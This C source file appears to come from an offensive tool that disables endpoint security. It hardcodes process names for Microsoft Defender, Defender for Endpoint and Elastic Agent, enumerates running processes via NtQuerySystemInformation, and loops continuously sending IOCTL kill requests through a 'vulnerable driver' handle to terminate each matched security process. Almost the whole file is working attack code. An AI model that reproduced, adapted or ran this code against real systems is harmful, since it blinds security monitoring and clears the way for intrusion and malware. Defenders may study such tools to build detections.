#include "common.h"

// List of known EDR-related process names
const wchar_t* g_EDRNames[] = {
	// Microsoft Defender Antivirus
	L"MsMpEng.exe",                 // AV service
	L"NisSrv.exe",                  // Network Inspection Service
	L"MpDefenderCoreService.exe",   // Core platform service
	L"smartscreen.exe",             // SmartScreen

	// Microsoft Defender for Endpoint
	L"MsSense.exe",                 // Sensor service
	L"SenseIR.exe",                 // IR process
	L"SenseNdr.exe",                // Network Detection and Response
	L"SenseCncProxy.exe",           // CNC proxy
	L"SenseSampleUploader.exe",     // Sample uploader
	L"SenseTVM.exe",                // Threat & Vulnerability Management

	// Elastic EDR
	L"elastic-agent.exe",       // Core Elastic Agent 
	L"elastic-endpoint.exe",    // Elastic Endpoint Security (EDR component)
	L"filebeat.exe",            // Collects and ships log files
	L"metricbeat.exe",          // Collects system and service metrics
	L"winlogbeat.exe"			// Collects Windows Event Logs
};

//// Just kill msedge for testing
//const wchar_t* g_EDRNames[] = {
//    L"msedge.exe",
//};

// Total number of known EDR names
const SIZE_T g_EDRCount = sizeof(g_EDRNames) / sizeof(g_EDRNames[0]);

// Get PID of all the EDR processes and store them in custom struct
BOOL EnumerateEDRProcessesPID(OUT PPROCESS_ENTRY* ppProcessList, OUT DWORD* pdwProcessCount) {

	BOOL							bSTATE				= TRUE;
	HMODULE							hNTDLL				= NULL; // Stores handle to ntdll.dll
	NTSTATUS						STATUS				= NULL;	// Store NTSTATUS value
	HANDLE							hGetProcessHeap		= NULL;	// Handle to process heap
	ULONG							uReturnLen1			= NULL; // Stores the size of system information 1st NtQuerySystemInformation call
	ULONG							uReturnLen2			= NULL;	// Stores size of system information 2nd NtQuerySystemInformation call
	PSYSTEM_PROCESS_INFORMATION		pSystemProcInfo		= NULL; // A pointer to memory which receives the requested information
	PSYSTEM_PROCESS_INFORMATION		pTemp				= NULL; // Temp for iteration
	PVOID							pValueToFree		= NULL; // Save initial value of pSystemProcInfo to free later
	DWORD							dwCount				= 0;	// Matching process count
	PPROCESS_ENTRY					pList				= NULL; // Final list of EDR entries
	PBOOL							pbSeen				= NULL; // Bool value to prevent duplicate processes and paths

	// Get handle to ntdll.dll
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
	hNTDLL = GetModuleHandleW(L"ntdll.dll");
	if (!hNTDLL) {
		errorWin32("GetModuleHandleW - Failed to get handle to ntdll.dll");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	//info_t("GetModuleHandleW - Received handle to ntdll.dll 0x%p", hNTDLL);

	// Resolve address of NtQuerySystemInformation
	fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNTDLL, "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation) {
		errorWin32("GetProcAddress - Failed to address of NtQuerySystemInformation");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	//info_t("GetProcAddress - Received address to NtQuerySystemInformation 0x%p", pNtQuerySystemInformation);

	// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
	// First NtQuerySystemInformation call, which fails but will save the 
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	pNtQuerySystemInformation(
		SystemProcessInformation,	// Returns an array of SYSTEM_PROCESS_INFORMATION structures, one for each process running in the system.
		NULL,						// Can be null the first time calling
		NULL,						// Can be null the first time calling
		&uReturnLen1				// Save the size of the system information
	);
	//info_t("NtQuerySystemInformation - Retrieved size in bytes for the system information: %d", uReturnLen1);

	// Get handle to process heap
	hGetProcessHeap = GetProcessHeap();

	// Allocating enough buffer for the returned array of SYSTEM_PROCESS_INFORMATION struct
	pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(hGetProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (pSystemProcInfo == NULL) {
		errorWin32("HeapAlloc - failed to allocate memory");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	//info_t("HeapAlloc - Allocated %d bytes of memory for SystemProcessInformation at 0x%p", uReturnLen1, pSystemProcInfo);

	// As 'pSystemProcInfo' will be modified, save the initial value
	pValueToFree = pSystemProcInfo;

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'pSystemProcInfo'
	STATUS = pNtQuerySystemInformation(
		SystemProcessInformation,	// Returns an array of SYSTEM_PROCESS_INFORMATION structures, one for each process running in the system.
		pSystemProcInfo,			// A pointer to a buffer that receives the requested information. 
		uReturnLen1,				// Size of the buffer pointed to by the SystemInformation parameter, in bytes.
		&uReturnLen2				// Size returned
	);
	if (STATUS != 0x0) {
		error("NtQuerySystemInformation - failed with error: 0x%0.8X", STATUS);
		HeapFree(hGetProcessHeap, 0, pSystemProcInfo);
		bSTATE = FALSE;
		goto _cleanUp;
	}
	//info_t("NtQuerySystemInformation - Retrieved size in bytes of system information: %d at 0x%p", uReturnLen2, pSystemProcInfo);

	// Allocate memory for bool value for each EDR process
	pbSeen = (BOOL*)HeapAlloc(hGetProcessHeap, HEAP_ZERO_MEMORY, sizeof(BOOL) * g_EDRCount);
	if (!pbSeen) {
		errorWin32("HeapAlloc - Failed to allocate memory for seen tracking");
		bSTATE = FALSE;
		goto _cleanUp;
	}

	// First pass: count EDR processes to count memory required
	pTemp = pSystemProcInfo;
	while (TRUE) {
		if (pTemp->ImageName.Length && pTemp->ImageName.Buffer != NULL) {
			for (DWORD i = 0; i < g_EDRCount; i++) {
				if (_wcsicmp(pTemp->ImageName.Buffer, g_EDRNames[i]) == 0) {

					// Only count if we haven't seen this one before
					if (!pbSeen[i]) {
						pbSeen[i] = TRUE;
						dwCount++;
					}

					break;
				}
			}
		}
		if (!pTemp->NextEntryOffset) break;
		pTemp = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pTemp + pTemp->NextEntryOffset);
	}

	if (dwCount == 0) {
		//info_t("EnumerateProcesses - No EDR processes found");
		goto _cleanUp;
	}

	// Allocate memory for x count EDR process list
	pList = (PPROCESS_ENTRY)HeapAlloc(hGetProcessHeap, HEAP_ZERO_MEMORY, sizeof(PROCESS_ENTRY) * dwCount);
	if (!pList) {
		errorWin32("HeapAlloc - Failed to allocate PROCESS_ENTRY list");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	//info_t("HeapAlloc - Allocated %i bytes of memory for the EDR process struct at 0x%p", sizeof(PROCESS_ENTRY) * dwCount, pList);

	// Reset seen flags before second pass
	RtlZeroMemory(pbSeen, sizeof(BOOL) * g_EDRCount);

	// Second pass: extract only matched EDR processes
	DWORD dwIndex = 0;
	pTemp = pSystemProcInfo;

	while (TRUE) {

		//infoW(L"Enumerated process \"%s\" - Of PID: %d", SystemProcInfo->ImageName.Buffer, SystemProcInfo->UniqueProcessId);

		// Check if this process has a name to compare
		if (pTemp->ImageName.Length && pTemp->ImageName.Buffer != NULL) {

			// Compare process name to known EDR process names
			for (DWORD i = 0; i < g_EDRCount; i++) {

				if (_wcsicmp(pTemp->ImageName.Buffer, g_EDRNames[i]) == 0) {

					// Check if EDR is already on the list
					if (pbSeen[i])
						break;

					// Set EDR index true
					pbSeen[i] = TRUE;

					// Store the PID of the matched EDR process
					pList[dwIndex].dwPid = (DWORD)(ULONG_PTR)pTemp->UniqueProcessId;

					// Allocate and copy the process name
					SIZE_T uNameLen = (pTemp->ImageName.Length / sizeof(WCHAR)) + 1;
					pList[dwIndex].pwszName = (LPWSTR)HeapAlloc(hGetProcessHeap, HEAP_ZERO_MEMORY, uNameLen * sizeof(WCHAR));
					if (pList[dwIndex].pwszName) {
						wcsncpy_s(pList[dwIndex].pwszName, uNameLen, pTemp->ImageName.Buffer, _TRUNCATE);
					}

					// Move to next available index in the EDR process list
					dwIndex++;
					break;
				}
			}
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!pTemp->NextEntryOffset) {

			//info_t("Reached end of SystemProcInfo array");

			break;
		}

		// From Docs: The start of the next item in the array is the address of the previous item plus the value in the NextEntryOffset member. 
		// https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-system_process_information
		pTemp = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pTemp + pTemp->NextEntryOffset);
	}

	// Give back the values
	*ppProcessList = pList;
	*pdwProcessCount = dwIndex;

_cleanUp:

	// Free the allocated PROCESS_ENTRY list on failure
	if (!bSTATE && pList) {
		for (DWORD i = 0; i < dwCount; i++) {
			if (pList[i].pwszName) {
				HeapFree(hGetProcessHeap, 0, pList[i].pwszName);
			}
		}
		HeapFree(hGetProcessHeap, 0, pList);
	}

	// Free the initial address
	if (pValueToFree) {
		HeapFree(hGetProcessHeap, 0, pValueToFree);
	}

	// Free BOOL
	if (pbSeen) {
		HeapFree(hGetProcessHeap, 0, pbSeen);
	}

	return bSTATE;
}

// Function to clean the EDR process list generated by EnumerateEDRProcessesPID
void FreeEDRProcessList(PPROCESS_ENTRY pList, DWORD dwCount, HANDLE hHeap) {
	if (pList) {
		for (DWORD i = 0; i < dwCount; i++) {
			if (pList[i].pwszName) {
				HeapFree(hHeap, 0, pList[i].pwszName);
				pList[i].pwszName = NULL;
			}
		}
		HeapFree(hHeap, 0, pList);
	}
}

// Function that will keep looping till q is pressed to exit, will keep looping for processes and kill EDR processes
BOOL KillEdrProcesses() {

	BOOL				bSTATE			= TRUE;
	HANDLE				hDevice			= NULL;		// Stores handle to the device driver
	HANDLE				hProcessHeap	= NULL;		// Handle to process heap
	PPROCESS_ENTRY		pProcList		= NULL;		// Stores pointer to the custom process list struct
	DWORD				dwProcCount		= 0;		// Stores the amount of processes
	wsftprmKillBuffer	KillBuffer		= { 0 };	// Kill buffer which holds the PID and padding for the vulnerable driver
	BOOL				bShouldReopenHandle = FALSE;
	DWORD				dwHandleAttempt = 0;

	// Open a handle to the vulnerable driver using symbolik link
	for (dwHandleAttempt = 0; dwHandleAttempt < g_DEVICEHANDLE_RETRY_COUNT && hDevice == NULL; dwHandleAttempt++) {
		hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
		if (hDevice != NULL) {
			break;
		}

		info("GetDeviceHandle - Attempt %u/%u failed, retrying in %u ms",
			(unsigned int)(dwHandleAttempt + 1),
			(unsigned int)g_DEVICEHANDLE_RETRY_COUNT,
			(unsigned int)g_DEVICEHANDLE_RETRY_DELAY);
		Sleep(g_DEVICEHANDLE_RETRY_DELAY);
	}
	if (hDevice == NULL) {
		error("GetDeviceHandle - Unable to open device handle after retries");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);

	// Get handle to process heap
	hProcessHeap = GetProcessHeap();

	// Keep looping till q is pressed
	while (TRUE) {

		// Enumerate all the EDR processes
		if (!EnumerateEDRProcessesPID(&pProcList, &dwProcCount)) {
			error("EnumerateEDRProcessesPID - Failed to enumerate running processes, sleeping and continuiing");
			
			// Make sure nothing leaks if allocation happened inside the function
			if (pProcList) {
				FreeEDRProcessList(pProcList, dwProcCount, hProcessHeap);
				pProcList = NULL;
				dwProcCount = 0;
			}

			// Sleep and retry next interation
			Sleep(g_SLEEPTIME);
			continue;

		}
		info_t("EnumerateEDRProcessesPID - %i EDR processes enumerated", dwProcCount);

		if (dwProcCount != 0) {
			
			// Print EDR Process info
			for (DWORD i = 0; i < dwProcCount; i++) {
				infoW_t("\tMatched EDR process: \"%ls\" with PID %d", pProcList[i].pwszName, pProcList[i].dwPid);
			}

			for (DWORD i = 0; i < dwProcCount; i++) {

				// Set the pid
				KillBuffer.dwPID = pProcList[i].dwPid;

				// Zero out the padding (optional if already zero-initialized)
				memset(KillBuffer.bPadding, 0, sizeof(KillBuffer.bPadding));

				// If PID is valid, send IOCTL
				BOOL bIoctlSuccess = DeviceIoControl(
					hDevice,
					IOCTL_CODE,
					&KillBuffer,
					sizeof(KillBuffer),
					NULL,
					0,
					NULL,
					NULL
				);
				if (!bIoctlSuccess) {
					DWORD dwErr = GetLastError();
					infoW_t("[-] DeviceIoControl - Failed to kill process \"%ws\" with PID %d (err=%lu)", pProcList[i].pwszName, pProcList[i].dwPid, dwErr);
					if (dwErr == ERROR_INVALID_HANDLE || dwErr == ERROR_FILE_NOT_FOUND || dwErr == ERROR_DEVICE_NOT_CONNECTED) {
						bShouldReopenHandle = TRUE;
					}
				}
				else {
					infoW_t("DeviceIoControl - Killed process \"%ls\" with PID %d", pProcList[i].pwszName, pProcList[i].dwPid);
				}
			}

			// Free the EDR process list entries
			FreeEDRProcessList(pProcList, dwProcCount, hProcessHeap);

			// Reset proclist
			pProcList = NULL;
			dwProcCount = 0;
		}

		if (bShouldReopenHandle) {
			if (hDevice) {
				CloseHandle(hDevice);
				hDevice = NULL;
			}

			for (dwHandleAttempt = 0; dwHandleAttempt < g_DEVICEHANDLE_RETRY_COUNT && hDevice == NULL; dwHandleAttempt++) {
				hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
				if (hDevice != NULL) {
					info("GetDeviceHandle - Reopened device handle after failure");
					break;
				}

				info("GetDeviceHandle - Retry %u/%u failed, waiting %u ms",
					(unsigned int)(dwHandleAttempt + 1),
					(unsigned int)g_DEVICEHANDLE_RETRY_COUNT,
					(unsigned int)g_DEVICEHANDLE_RETRY_DELAY);
				Sleep(g_DEVICEHANDLE_RETRY_DELAY);
			}

			if (hDevice == NULL) {
				error("GetDeviceHandle - Unable to recover device handle, exiting loop");
				bSTATE = FALSE;
				break;
			}

			bShouldReopenHandle = FALSE;
		}

		printf("[!] Press 'q' to exit the loop\n");

		// Exit if 'q' is pressed
		if (_kbhit()) {
			int ch = _getch();
			if (ch == 'q' || ch == 'Q') {
				printf("Exit key pressed.\n");
				break;
			}
		}

		Sleep(g_SLEEPTIME);
	}

_cleanUp:
	
	// Close handle to device
	if (hDevice) {
		CloseHandle(hDevice);
	}

	// Free the EDR process list entries
	if (pProcList) {
		FreeEDRProcessList(pProcList, dwProcCount, hProcessHeap);
	}

	return bSTATE;

}
